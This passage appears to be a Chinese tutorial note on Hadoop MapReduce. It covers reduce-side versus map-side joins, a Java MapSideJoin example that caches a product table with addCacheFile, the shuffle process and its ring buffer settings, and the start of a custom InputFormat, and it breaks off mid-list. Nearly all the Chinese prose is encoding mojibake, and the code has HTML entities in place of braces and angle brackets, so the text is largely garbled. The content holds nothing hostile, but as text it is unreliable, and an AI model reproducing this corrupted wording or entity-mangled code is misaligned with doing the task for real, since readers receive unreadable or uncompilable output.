å°†2ä¸ªè¡¨æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ Map ç«¯ è¯»å–ä¸¤ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œ è¿›è¡Œåˆ‡åˆ†ã€å‘é€ key ï¼š å…¬å…±å­—æ®µâ€“å…³è”å­—æ®µâ€“pid valueï¼š å‰©ä¸‹çš„å­—æ®µï¼Œ æ ‡è®°æ•°æ®çš„æ¥æºè¡¨ Reduce ç«¯ é€šè¿‡ç¼–è¾‘åˆ†ç¦»å‡º2ä¸ªè¡¨çš„æ•°æ® åˆ†åˆ«å­˜åˆ°2ä¸ªå®¹å™¨ä¸­ï¼ˆArrayListï¼‰ éå†å¤§è¡¨ï¼Œæ‹¼æ¥å°è¡¨ ä»£ç å‚è€ƒç»ƒä¹ -ç¬¬ä¸‰é¢˜MRå®ç°2ä¸ªè¡¨ä¹‹é—´çš„Join ç¼ºé™·1. ReduceTask çš„å¹¶è¡Œåº¦é—®é¢˜ï¼š å»ºè®®0.95*datanode çš„ä¸ªæ•° å¹¶è¡Œåº¦ä¸é«˜ï¼Œ æ€§èƒ½ä¸é«˜ 2. å®¹å™¨æ€§èƒ½ list ç­‰ï¼Œ ä¸æå€¡ï¼Œ reduce æ¥æ”¶çš„æ•°æ®ï¼Œ å¯èƒ½ä¼šå¾ˆå¤§ 3. ReduceTask å®¹æ˜“äº§ç”Ÿæ•°æ®å€¾æ–œ å‡è®¾æˆ‘ä»¬è®¾ç½®å¤šä¸ª ReduceTaskï¼Œ æ ¹æ®åˆ†åŒºè§„åˆ™ï¼Œ é»˜è®¤ hash ä»¥ keyå…³è”æ¡ä»¶åˆ†ï¼Œ ReduceTaskæ•°æ®å€¾æ–œï¼Œ æ¯ä¸ª ReduceTask åˆ†å·¥ä¸å‡ï¼Œ éå¸¸å½±å“æ€§èƒ½ï¼Œæ²¡æœ‰åˆç†çš„åˆ©ç”¨é›†ç¾¤èµ„æº åœ¨çœŸå®çš„ç”Ÿäº§ä¸­ä¸€å®šè¦å°½é‡çš„é¿å…æ•°æ®å€¾æ–œ æœ€å¥½çš„åšæ³•ï¼šå°†åˆ†åŒºè®¾è®¡çš„è¶³å¤Ÿå®Œç¾ï¼Œéš¾åº¦æ¯”è¾ƒå¤§ å› æ­¤ï¼ŒReduceTask ä¸€èˆ¬ä¸ä¼šå®Œæˆ Johnå·¥ä½œ æ”¾åœ¨ Map ç«¯å®Œæˆå°±ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜äº† è¡¥å……ï¼šMapper ä¸­çš„æºç åˆ†æ123456789101112131415public void run(Context context) throws IOException, InterruptedException &#123; // åœ¨ maptask æ‰§è¡Œä¹‹å‰è°ƒç”¨ä¸€æ¬¡ï¼Œ ä¸€ä¸ª maptask åªä¼šè°ƒç”¨ä¸€æ¬¡ã€‚setup ä¸­é€šå¸¸ä¼šå¸® map ä¸­åˆå§‹åŒ–ä¸€äº›å˜é‡å’Œèµ„æºï¼Œ æ¯”å¦‚æ•°æ®åº“çš„è¿æ¥ç­‰ã€‚ // ä¸»è¦ç›®çš„ï¼šå‡å°‘èµ„æºçš„åˆå§‹åŒ–æ¬¡æ•°è€Œæå‡ç¨‹åºçš„æ€§èƒ½ setup(context); try &#123; // è·å–æ–‡ä»¶æ˜¯å¦è¿˜æœ‰ä¸‹ä¸€è¡Œï¼Œ ä¸€è¡Œåªè°ƒç”¨ä¸€æ¬¡ while (context.nextKeyValue()) &#123; map(context.getCurrentKey(), context.getCurrentValue(), context); &#125; &#125; finally &#123; // maptask ä»»åŠ¡æ‰§è¡Œå®Œæˆä¹‹åä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œä¸€ä¸ª maptask åªä¼šè°ƒç”¨ä¸€æ¬¡ // å¸® map å¤„ç†ä¸€äº›å–„åå·¥ä½œï¼Œ æ¯”å¦‚ï¼šèµ„æºçš„å…³é—­ cleanup(context); &#125; &#125; 5. Map ç«¯çš„ Joinæ³¨æ„ç‚¹ï¼šè¿™ç§æ–¹å¼åªèƒ½é€šè¿‡ Jar åŒ…ä¸Šä¼ çš„æ–¹å¼ï¼Œç›´æ¥ç”¨ Eclipse ä¼šæ‰¾ä¸åˆ°ç¼“å­˜ ä¸ºäº†æå‡ Map ç«¯ Join æ€§èƒ½ï¼Œ æˆ‘ä»¬çš„ç­–ç•¥æ˜¯ï¼Œ å°†å°è¡¨çš„æ•°æ®åŠ è½½åˆ°æ¯ä¸ªè¿è¡Œçš„ MapTask çš„å†…å­˜ä¸­ã€‚ å¦‚æœå°è¡¨è¢«åŠ è½½åˆ°äº†å†…å­˜ä¸­ï¼Œ æˆ‘ä»¬æ¯æ¬¡åœ¨ Map ç«¯åªéœ€è¦è¯»å–å¤§è¡¨ï¼Œå½“è¯»å–åˆ°å¤§è¡¨çš„æ¯ä¸€è¡Œæ•°æ®ï¼Œå¯ä»¥ç›´æ¥å’Œå†…å­˜ä¸­çš„å°è¡¨è¿›è¡Œå…³è”ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œåªéœ€è¦ Map å°±å¯ä»¥å®Œæˆ Join æ“ä½œäº†ã€‚ 1. å¦‚ä½•å°†å°è¡¨åŠ å…¥åˆ°å†…å­˜ä¸­ï¼Ÿ12// å°†æŒ‡å®šè·¯å¾„æ–‡ä»¶åŠ è½½åˆ°ç¼“å­˜ä¸­job.addCacheFile(new URI("/xxx")); 2. Map ç«¯æ€æ ·è¯»å–ç¼“å­˜ä¸­çš„æ•°æ®æƒ³è¦åœ¨ Java ä¸­ä½¿ç”¨ç¼“å­˜ä¸­çš„æ•°æ®ï¼Œç¼“å­˜ä¸­çš„æ•°æ®å¿…é¡»å°è£…åˆ° Java çš„å®¹å™¨ä¸­ 12// è·å–ç¼“å­˜æ–‡ä»¶context.getLocalCacheFiles()[0] 3. ä»£ç å‚è€ƒç»ƒä¹ -ç¬¬3é¢˜ ä»£ç æ³¨æ„ç‚¹ï¼š setupï¼šä»ç¼“å­˜è¯»å–ä¸€æ–‡ä»¶ï¼ˆå¤šå¯¹ä¸€çš„ä¸€ï¼‰åˆ° HashMap main æ–¹æ³•ä¸­æ³¨æ„ç‚¹ 12345// æŒ‡å®šæ–‡ä»¶åŠ å…¥ç¼“å­˜job.addCacheFile(new URI("/xxx")); // å¦‚æœæ²¡æœ‰ReduceTaskï¼Œ è¦è®¾ç½®ä¸º0job.setNumReduceTasks(0); ç¤ºèŒƒä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import java.io.BufferedReader;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStreamReader;import java.net.URI;import java.util.HashMap;import java.util.Map;import org.apache.commons.lang.StringUtils;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MapSideJoin &#123; public static class MapSideJoinMapper extends Mapper&lt;LongWritable, Text, Text, NullWritable&gt; &#123; // ç”¨ä¸€ä¸ªhashmapæ¥åŠ è½½ä¿å­˜äº§å“ä¿¡æ¯è¡¨ Map&lt;String, String&gt; pdInfoMap = new HashMap&lt;String, String&gt;(); Text k = new Text(); /** * é€šè¿‡é˜…è¯»çˆ¶ç±»Mapperçš„æºç ï¼Œå‘ç° setupæ–¹æ³•æ˜¯åœ¨maptaskå¤„ç†æ•°æ®ä¹‹å‰è°ƒç”¨ä¸€æ¬¡ å¯ä»¥ç”¨æ¥åšä¸€äº›åˆå§‹åŒ–å·¥ä½œ */ @Override protected void setup(Context context) throws IOException, InterruptedException &#123; BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("pdts.txt"))); String line; while (StringUtils.isNotEmpty(line = br.readLine())) &#123; String[] fields = line.split(","); pdInfoMap.put(fields[0], fields[1]); &#125; br.close(); &#125; // ç”±äºå·²ç»æŒæœ‰å®Œæ•´çš„äº§å“ä¿¡æ¯è¡¨ï¼Œæ‰€ä»¥åœ¨mapæ–¹æ³•ä¸­å°±èƒ½å®ç°joiné€»è¾‘äº† @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String orderLine = value.toString(); String[] fields = orderLine.split("\t"); String pdName = pdInfoMap.get(fields[1]); k.set(orderLine + "\t" + pdName); context.write(k, NullWritable.get()); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf); job.setJarByClass(MapSideJoin.class); job.setMapperClass(MapSideJoinMapper.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); FileInputFormat.setInputPaths(job, new Path("D:/srcdata/mapjoininput")); FileOutputFormat.setOutputPath(job, new Path("D:/temp/output")); // æŒ‡å®šéœ€è¦ç¼“å­˜ä¸€ä¸ªæ–‡ä»¶åˆ°æ‰€æœ‰çš„maptaskè¿è¡ŒèŠ‚ç‚¹å·¥ä½œç›®å½• /* job.addArchiveToClassPath(archive); */// ç¼“å­˜jaråŒ…åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„classpathä¸­ /* job.addFileToClassPath(file); */// ç¼“å­˜æ™®é€šæ–‡ä»¶åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„classpathä¸­ /* job.addCacheArchive(uri); */// ç¼“å­˜å‹ç¼©åŒ…æ–‡ä»¶åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„å·¥ä½œç›®å½• /* job.addCacheFile(uri) */// ç¼“å­˜æ™®é€šæ–‡ä»¶åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„å·¥ä½œç›®å½• // å°†äº§å“è¡¨æ–‡ä»¶ç¼“å­˜åˆ°taskå·¥ä½œèŠ‚ç‚¹çš„å·¥ä½œç›®å½•ä¸­å» job.addCacheFile(new URI("file:/D:/srcdata/mapjoincache/pdts.txt")); //mapç«¯joinçš„é€»è¾‘ä¸éœ€è¦reduceé˜¶æ®µï¼Œè®¾ç½®reducetaskæ•°é‡ä¸º0 job.setNumReduceTasks(0); boolean res = job.waitForCompletion(true); System.exit(res ? 0 : 1); &#125;&#125; 6. å¯¹æ¯”MapJoin çš„æ–¹å¼ï¼š å¤§ &amp; å°è¡¨ å› ä¸ºæœ‰ä¸€ä¸ªè¡¨éœ€è¦åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ³¨å®šåŠ è½½åˆ°å†…å­˜ä¸­çš„è¡¨ä¸èƒ½è¿‡å¤§ï¼ˆhive ä¸­é»˜è®¤æ˜¯256Mï¼‰ å¤§è¡¨ &amp; å¤§è¡¨ å¦‚ä½•è®¾è®¡ ReduceJoin ï¼š è§£å†³æ•°æ®å€¾æ–œçš„é—®é¢˜ï¼Œåˆç†è®¾è®¡åˆ†åŒºã€‚ â€”å¾ˆéš¾åšåˆ° å°†å…¶ä¸­ä¸€ä¸ªå¤§è¡¨è¿›è¡Œåˆ‡åˆ†ï¼Œåˆ‡åˆ†æˆå°è¡¨ï¼Œ æœ€ç»ˆæ‰§è¡Œ å¤§è¡¨ &amp; å°è¡¨ ä¼˜ç‚¹ å¹¶è¡Œåº¦é«˜ï¼Œä¸å­˜åœ¨æ•°æ®å€¾æ–œçš„é—®é¢˜ï¼Œè¿è¡Œæ•ˆç‡é«˜ ä¼˜å…ˆé€‰æ‹©MapJoin :arrow_forward: 7. æ’åºç®—æ³• ï¼ˆå¾…æ•´ç†ï¼šTODOï¼‰1. å¿«é€Ÿæ’åºè¾¹ç•Œå€¼å§‹ç»ˆæ˜¯ä¸å˜çš„ã€‚ 2. å½’å¹¶æ’åºä¸€èˆ¬æƒ…å†µé’ˆå¯¹æœ‰åºçš„ï¼Œå¤šä¸ªï¼Œ å°æ•°æ®é›† åº”ç”¨åœºæ™¯ï¼šæƒ³åˆ°äº†å¤šä¸ªReduce ä»»åŠ¡äº§ç”Ÿçš„å¤šä¸ªæ–‡ä»¶çš„åˆå¹¶ 1. å½’å¹¶æ’åºå‰ä¼ ï¼š åˆå¹¶å¤šä¸ªæ•°ç»„ 2. å½’å¹¶æ’åº ä¹‹ ä¸€ä¸ªå¤§æ•°æ®é›†â€”å½’â€”â€”â€”-åˆ‡åˆ†æˆå•ä¸ªçš„æ•°æ®é›† â€”-å¹¶â€”â€”â€” ä¸¤ä¸¤ç›¸å¹¶ï¼Œ å¹¶æˆæ–°çš„æ•°ç»„ï¼Œ å°çš„å…ˆæ”¾å…¥æ•°ç»„ï¼Œ å†æ”¾å¤§çš„ æ–°çš„æ•°ç»„å†ä¸æ–­æ‰§è¡Œ ä¸Šè¿°çš„ åˆå¹¶å¤šä¸ªæ•°ç»„ 8. â€» Shuffle è¿‡ç¨‹ â€» mapper é˜¶æ®µå¤„ç†çš„æ•°æ®å¦‚ä½•ä¼ é€’ç»™ reducer é˜¶æ®µï¼Œæ˜¯ MapReduce æ¡†æ¶ä¸­ æœ€å…³é”®çš„ä¸€ä¸ªæµç¨‹ï¼Œè¿™ä¸ªæµç¨‹å°±å« Shuffle Shuffle å³ æ•°æ®æ··æ´— â€”â€” æ ¸å¿ƒæœºåˆ¶ï¼šæ•°æ®åˆ†åŒºï¼Œæ’åºï¼Œå±€éƒ¨èšåˆï¼Œç¼“å­˜ï¼Œæ‹‰å–ï¼Œå†åˆå¹¶ï¼Œæ’åºï¼› ç¯å½¢ç¼“å†²åŒº å†…å­˜ä¸­çš„ä¸€ç§é¦–å°¾ç›¸è¿çš„æ•°æ®ç»“æ„ï¼ˆåº•å±‚æ˜¯å­—èŠ‚æ•°ç»„ï¼‰ï¼Œkvbuffer åŒ…å«åŸå§‹æ•°æ®åŒºå’Œå…ƒæ•°æ®åŒºï¼Œä¸€ä¸ªmapTaskä»»åŠ¡å¯¹åº”ä¸€ä¸ªç¯å½¢ç¼“å†²åŒº é»˜è®¤å¤§å° 100Mï¼Œé»˜è®¤é˜ˆ(yu)å€¼ 0.8ï¼Œå³å½“è¾¾åˆ° 80M åï¼Œä¼šè§¦å‘ spillæº¢å†™ æ“ä½œï¼Œå°†æ•°æ®å†™å…¥ç£ç›˜ï¼Œæ­¤æ—¶mapperè¾“å‡ºä¼šç»§ç»­å‘å‰©ä½™20Mä¸­å†™æ•°æ®ç¼“å†²åŒºå¤§å° mapred-site.xmlï¼šmapreduce.task.io.sort.mbé˜ˆå€¼ mapred-site.xmlï¼šmapreduce.map.sort.spill.percentè·¯å¾„ï¼šmapred-site.xmlï¼šmapreduce.cluster.local.dir å¦‚æœæ­¤80Mæ•°æ®å†™å…¥ç£ç›˜å®Œæˆå‰ï¼Œå‰©ä½™20Mç¼“å†²åŒºä¹Ÿå†™å®Œï¼Œåˆ™ä¼šè¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç›´åˆ°æ˜¯spillå®Œæˆè…¾å‡ºç¼“å†²åŒºç©ºé—´ èµ¤é“ï¼ˆequtorï¼‰ï¼šç¯å½¢ç¼“å†²åŒºä¸­åŸå§‹æ•°æ®å’Œå…ƒæ•°æ®çš„è¾¹ç•Œ åŸå§‹æ•°æ®ï¼šmapTaskè¾“å‡ºçš„æ•°æ® å…ƒæ•°æ® è®°å½•åŸå§‹æ•°æ®çš„æ•°æ®ï¼ŒåŒ…å«4éƒ¨åˆ†å†…å®¹ï¼Œå 16*4å­—èŠ‚ï¼› æ¯ä¸€æ¡å…ƒæ•°æ®å ç”¨ç©ºé—´æ˜¯ä¸€æ ·çš„ï¼Œæ’åºå¯ä»¥é€šè¿‡äº¤æ¢å…ƒæ•°æ®å®ç° åˆ†ç±» a. åŸå§‹æ•°æ®ä¸­keyçš„èµ·å§‹ä½ç½® b. åŸå§‹æ•°æ®ä¸­valueçš„èµ·å§‹ä½ç½® c. valueçš„é•¿åº¦ d. åˆ†åŒºä¿¡æ¯ï¼Œå³è¯¥æ¡ä¿¡æ¯å±äºå“ªä¸ªåˆ†åŒº æ ¸å¿ƒæ“ä½œ \1. åˆ†åŒº partitionï¼ˆå¦‚æœ reduceTask åªæœ‰ä¸€ä¸ªæˆ–è€…æ²¡æœ‰ï¼Œé‚£ä¹ˆ partition å°†ä¸èµ·ä½œç”¨ï¼‰ \2. Sort æ ¹æ® key æ’åºï¼ˆMapReduce ç¼–ç¨‹ä¸­çš„ sort æ˜¯ä¸€å®šä¼šåšçš„ï¼Œå¹¶ä¸” åªèƒ½æŒ‰ç…§ keyæ’åºï¼Œ å½“ç„¶ å¦‚æœæ²¡æœ‰ reducer é˜¶æ®µï¼Œé‚£ä¹ˆå°±ä¸ä¼šå¯¹ key æ’åºï¼‰ \3. Combiner è¿›è¡Œå±€éƒ¨ value çš„åˆå¹¶ï¼ˆCombiner æ˜¯å¯é€‰çš„ç»„ä»¶ï¼Œä½œç”¨åªæ˜¯ä¸ºäº†æé«˜ä»»åŠ¡çš„æ‰§è¡Œæ•ˆç‡ï¼‰ è¯¦ç»†è¿‡ç¨‹ \1. ä¸€ä¸ªå¤§æ–‡ä»¶éœ€è¦å¤„ç†ï¼Œå®ƒåœ¨åœ¨ HDFS ä¸Šæ˜¯ä»¥ block å—å½¢å¼å­˜æ”¾ï¼Œæ¯ä¸ª block é»˜è®¤ä¸º 128M å­˜ 3 ä»½ï¼›è¿è¡Œæ—¶æ¯ä¸ª map ä»»åŠ¡ä¼šå¤„ç†ä¸€ä¸ªåˆ‡å—ï¼ˆsplitï¼‰ï¼Œå¦‚æœ block å¤§å’Œ split ç›¸åŒï¼Œæœ‰å¤šå°‘ä¸ª block å°±æœ‰å¤šå°‘ä¸ª map ä»»åŠ¡ï¼›æ‰€ä»¥å¯¹æ•´ä¸ªæ–‡ä»¶å¤„ç†æ—¶ä¼šæœ‰å¾ˆå¤š map ä»»åŠ¡è¿›è¡Œå¹¶è¡Œè®¡ç®—ã€‚ \2. æ¯ä¸ª map ä»»åŠ¡å¤„ç†å®Œè¾“å…¥çš„åˆ‡å—åä¼šæŠŠç»“æœå†™å…¥åˆ°å†…å­˜çš„ä¸€ä¸ª ç¯å½¢ç¼“å†²åŒºï¼Œå†™å…¥è¿‡ç¨‹ä¸­ä¼šè¿›è¡Œç®€å•æ’åºï¼Œå½“ç¼“å†²åŒºçš„å¤§å°é˜€å€¼ï¼Œä¸€ä¸ªåå°çš„çº¿ç¨‹å°±ä¼šå¯åŠ¨æŠŠç¼“å†²åŒºä¸­çš„æ•°æ®æº¢å†™ï¼ˆspillï¼‰åˆ°æœ¬åœ°ç£ç›˜ä¸­ï¼ŒåŒæ—¶Mapperç»§ç»­æ—¶å‘ç¯å½¢ç¼“å†²åŒºä¸­å†™å…¥æ•°æ®ã€‚ æ•°æ®æº¢å†™å…¥åˆ°ç£ç›˜ä¹‹å‰ï¼Œé¦–å…ˆä¼šæ ¹æ® reducer çš„æ•°é‡åˆ’åˆ†æˆåŒæ•°é‡çš„åˆ†åŒºï¼ˆpartitionï¼‰ï¼Œæ¯ä¸ªåˆ†åŒºä¸­çš„éƒ½æ•°æ®ä¼šæœ‰åå°çº¿ç¨‹æ ¹æ® map ä»»åŠ¡çš„è¾“å‡ºç»“æœ key è¿›è¡Œæ’åºï¼› å¦‚æœæœ‰ combinerï¼Œå®ƒä¼šåœ¨ ç¼“å†²åŒºæº¢å†™åˆ°ç£ç›˜ä¹‹å‰ å’Œ mapTaskæ’å¥½åºçš„è¾“å‡ºä¸Š è¿è¡Œï¼Œä½¿å†™åˆ°æœ¬åœ°ç£ç›˜å’Œä¼ ç»™ reducer çš„æ•°æ®æ›´å°‘ï¼›Combinerå³æ˜¯æŠŠåŒä¸€åˆ†åŒºä¸­çš„åŒä¸€keyçš„æ•°æ®è¿›è¡Œåˆå¹¶ï¼Œæ•´ä¸ªshuffleè¿‡ç¨‹ä¼šè°ƒç”¨ä¸¤ä¸ªCombiner ! æœ€ååœ¨æœ¬åœ°ç”Ÿæˆåˆ†å¥½åŒºä¸”æ’å¥½åºçš„å°æ–‡ä»¶ã€‚ æ³¨æ„ï¼šå¦‚æœ map å‘ç¯å½¢ç¼“å†²åŒºå†™å…¥æ•°æ®çš„é€Ÿåº¦å¤§äºå‘æœ¬åœ°å†™å…¥æ•°æ®çš„é€Ÿåº¦ï¼Œç¯å½¢ç¼“å†²åŒºä¼šè¢«å†™æ»¡ï¼Œå‘ç¯å½¢ç¼“å†²åŒºå†™å…¥æ•°æ®çš„çº¿ç¨‹ä¼šé˜»å¡ç›´è‡³ç¼“å†²åŒºä¸­çš„å†…å®¹å…¨éƒ¨æº¢å†™åˆ°ç£ç›˜åå†æ¬¡å¯åŠ¨ï¼Œåˆ°é˜€å€¼åä¼šå‘æœ¬åœ°ç£ç›˜æ–°å»ºä¸€ä¸ªæº¢å†™æ–‡ä»¶ï¼› \3. map ä»»åŠ¡å®Œæˆä¹‹å‰ï¼Œä¼šæŠŠæœ¬åœ°ç£ç›˜æº¢å†™çš„æ‰€æœ‰æ–‡ä»¶ ä¸åœåœ° åˆå¹¶ï¼ˆmergeï¼‰æˆå¾—åˆ°ä¸€ä¸ªç»“æœæ–‡ä»¶ï¼Œåˆå¹¶å¾—åˆ°çš„ç»“æœæ–‡ä»¶ä¼šæ ¹æ®å°æº¢å†™æ–‡ä»¶çš„åˆ†åŒºè€Œåˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºçš„æ•°æ®ä¼šå†æ¬¡æ ¹æ® key è¿›è¡Œ æ’åºï¼Œå¾—åˆ°çš„ç»“æœæ–‡ä»¶æ˜¯åˆ†å¥½åŒºä¸”æ’å¥½åºçš„ï¼ˆå¯ä»¥åˆå¹¶æˆä¸€ä¸ªæ–‡ä»¶çš„æº¢å†™æ–‡ä»¶æ•°é‡é»˜è®¤ä¸º10ï¼‰ï¼›é»˜è®¤åˆå¹¶æº¢å†™æ–‡ä»¶æ•°é‡ mapred-site.xmlï¼šmapreduce.task.io.sort.factor \4. reduce ä»»åŠ¡å¯åŠ¨ï¼ŒReducer ä¸­çš„ä¸€ä¸ªçº¿ç¨‹å®šæœŸå‘ MRAppMaster è¯¢é—® Mapper è¾“å‡ºç»“æœæ–‡ä»¶ä½ç½®ï¼ŒMapper ç»“æŸåä¼šå‘ MRAppMaster æ±‡æŠ¥ä¿¡æ¯ï¼Œä»è€Œ Reducer ä¼šå¾—çŸ¥ Mapper çŠ¶æ€å¹¶å¾—åˆ° map ç»“æœæ–‡ä»¶ç›®å½•ï¼›reduceä»»åŠ¡æ•°é…ç½®a) mapred-site.xmlï¼šmapreduce.job.reducesb) job.setNumReduceTasks(num) \6. å½“æœ‰ä¸€ä¸ª Mapper ç»“æŸæ—¶ï¼Œreduce ä»»åŠ¡è¿›å…¥å¤åˆ¶é˜¶æ®µï¼Œreduce ä»»åŠ¡é€šè¿‡ http åè®®ï¼ˆhadoop å†…ç½®äº†nettyå®¹å™¨ï¼‰æŠŠæ‰€æœ‰ Mapper ç»“æœæ–‡ä»¶çš„ å¯¹åº”çš„åˆ†åŒºæ•°æ® æ‹‰å–ï¼ˆfetchï¼‰è¿‡æ¥ï¼ŒReducer å¯ä»¥å¹¶è¡Œå¤ åˆ¶ Mapper çš„ ç»“æœ ï¼Œ é»˜è®¤çº¿ç¨‹æ•°ä¸º5ï¼› æ‰€æœ‰ Reducer å¤åˆ¶å®Œæˆ map ç»“æœæ–‡ä»¶åï¼Œç”±äº Reducer å¯èƒ½ä¼šå¤±è´¥ï¼ŒNodeManager å¹¶ä¸ä¼šåœ¨ç¬¬ä¸€ä¸ª map ç»“æœæ–‡ä»¶å¤åˆ¶å®Œæˆåå°±åˆ é™¤å®ƒï¼Œè€Œæ˜¯ç›´åˆ°ä½œä¸šå®Œæˆå MRAppMaster é€šçŸ¥ NodeManager è¿›è¡Œåˆ é™¤ï¼› å¦å¤–å¦‚æœ map ç»“æœæ–‡ä»¶ç›¸å½“å°ï¼Œåˆ™ä¼šè¢«ç›´æ¥å¤åˆ¶åˆ° reduce NodeManager çš„å†…å­˜ï¼›ä¸€æ—¦ç¼“å†²åŒºè¾¾åˆ° reduce çš„é˜ˆå€¼å¤§å° 0.66 æˆ– å†™å…¥åˆ° reduce NodeManager å†… å­˜ ä¸­ æ–‡ ä»¶ ä¸ª æ•° è¾¾ åˆ° map è¾“å‡ºé˜ˆå€¼ 1000ï¼Œreduce å°±ä¼šæŠŠ map ç»“æœæ–‡ä»¶åˆå¹¶ï¼ˆmergeï¼‰æº¢å†™åˆ°æœ¬åœ°ï¼›é»˜è®¤çº¿ç¨‹æ•° mapred-site.xmlï¼šmapreduce.reduce.shuffle.parallelcopiesç¼“å†²åŒºå¤§å° mapred-site.xml:mapreduce.reduce.shuffle.input.buffer.percentï¼Œé»˜è®¤0.7é˜ˆå€¼ï¼šmapred-site.xml:mapreduce.reduce.shuffle.merge.percentï¼Œé»˜è®¤0.66mapè¾“å‡ºé˜ˆå€¼1000ï¼šmapred-site.xml:mapreduce.reduce.merge.inmem.threshold \7. å¤åˆ¶é˜¶æ®µå®Œæˆåï¼ŒReducer è¿›å…¥ Merge é˜¶æ®µï¼Œå¾ªç¯åœ°åˆå¹¶ map ç»“æœæ–‡ä»¶ï¼Œç»´æŒå…¶é¡ºåºæ’åºï¼Œåˆå¹¶å› å­é»˜è®¤ä¸º 10ï¼Œç»è¿‡ä¸æ–­åœ° Merge åå¾—åˆ°ä¸€ä¸ªâ€æœ€ç»ˆæ–‡ä»¶â€ï¼Œå¯èƒ½å­˜å‚¨åœ¨ç£ç›˜ä¹Ÿå¯èƒ½å­˜åœ¨å†…å­˜ä¸­ï¼› \8. â€œæœ€ç»ˆæ–‡ä»¶â€è¾“å…¥åˆ° reduce è¿›è¡Œè®¡ç®—ï¼Œè®¡ç®—ç»“æœè¾“å…¥åˆ° HDFSã€‚ [ æ³¨æ„ ] æº¢å†™å‰ä¼šå…ˆæŒ‰ç…§åˆ†åŒºè¿›è¡Œæ’åºï¼Œå†æŒ‰keyè¿›è¡Œæ’åºï¼Œé‡‡ç”¨ å¿«é€Ÿæ’åºæ’åºæ˜¯æŒ‰ç…§åŸå§‹æ•°æ®æ’åºï¼Œä½†æ˜¯ç”±äºåŸå§‹æ•°æ®ä¸å¥½ç§»åŠ¨ä¸”åŸå§‹æ•°æ®åŒ…å«äº†åŸå§‹æ•°æ®çš„ä½ç½®ä¿¡æ¯ï¼Œæ‰€ä»¥ç§»åŠ¨çš„å…¶å®æ˜¯å…ƒæ•°æ®ï¼›å†™å…¥æ—¶è¯»çš„æ˜¯å…ƒæ•°æ®ï¼ŒçœŸæ­£å†™å…¥çš„æ—¶åŸå§‹æ•°æ® æœ€åçš„æ•°æ®å¦‚æœä¸å¤Ÿ80Mï¼Œä¹Ÿä¼šè¢«å¼ºåˆ¶flushåˆ°ç£ç›˜ æ¯ä¸ªmapTaskä»»åŠ¡ç”Ÿæˆçš„ç£ç›˜å°æ•°æ®æœ€åéƒ½ä¼šmergeæˆä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œé‡‡ç”¨ å½’å¹¶æ’åº Shuffle ä¸­çš„ç¼“å†²åŒºå¤§å°ä¼šå½±å“åˆ° mapreduce ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ï¼ŒåŸåˆ™ä¸Šè¯´ï¼Œç¼“å†²åŒºè¶Šå¤§ï¼Œç£ ç›˜ioçš„æ¬¡æ•°è¶Šå°‘ï¼Œæ‰§è¡Œé€Ÿåº¦å°±è¶Šå¿«ã€‚ 10ã€è‡ªå®šä¹‰è¾“å…¥ InputFormat é»˜è®¤çš„æ–‡ä»¶åŠ è½½ï¼šTextInputFormat é»˜è®¤çš„æ–‡ä»¶è¯»å–ï¼šLineRecordReader æºç è¿½è¸ªè¿‡ç¨‹ï¼šcontext â€“&gt; mappercontext â€“&gt; mapcontext â€“&gt; reader â€“&gt; input â€“&gt; real â€“&gt; inputFormat.createRecordReaderï¼ˆsplitï¼ŒtaskContextï¼‰ï¼Œç„¶åæŸ¥æ‰¾ inputFormat â€“&gt; createRecordReaderï¼ˆsplitï¼ŒtaskContextï¼‰ï¼ŒinputFormat â€“&gt; TextInputFormatå®ä¾‹å¯¹è±¡ æ¡ˆä¾‹ï¼šå¤šä¸ªå°æ–‡ä»¶åˆå¹¶ word1.txt ~word10.txt æ¯æ¬¡è¯»å–ä¸€ä¸ªå°æ–‡ä»¶ è‡ªå®šä¹‰è¾“å…¥ï¼Œéœ€è¦åˆ›å»ºä¸¤ä¸ªç±»ï¼Œå¹¶é€šè¿‡Jobå¯¹è±¡æŒ‡å®šè‡ªå®šä¹‰è¾“å…¥ \1. åˆ›å»ºXxxInputFormatç±»ï¼Œç»§æ‰¿FileInputFormat&lt;&gt;ï¼Œé‡å†™ createRecordReader() æ–¹æ³• \2. åˆ›å»ºXxxRecordReaderç±»ï¼Œç»§æ‰¿RecordReader&lt;&gt;ï¼Œé‡å†™ä»¥ä¸‹æ–¹æ³•ï¼š initialize()ï¼šåˆå§‹åŒ–æ–¹æ³•ï¼Œç±»ä¼¼äºsetup()ï¼Œå¯¹å±æ€§ã€é“¾æ¥æˆ–æµè¿›è¡Œåˆå§‹åŒ– getCurrentKey()ï¼šè¿”å›key getCurrentValue()ï¼šè¿”å›value getProgress()ï¼šè¿”å›æ–‡ä»¶æ‰§è¡Œè¿›åº¦ nextKeyValue()ï¼šè¿”å›æ–‡ä»¶æ˜¯å¦è¯»å–ç»“æŸ close()ï¼šè¿›è¡Œä¸€äº›èµ„æºçš„é‡Šæ”¾ \3. 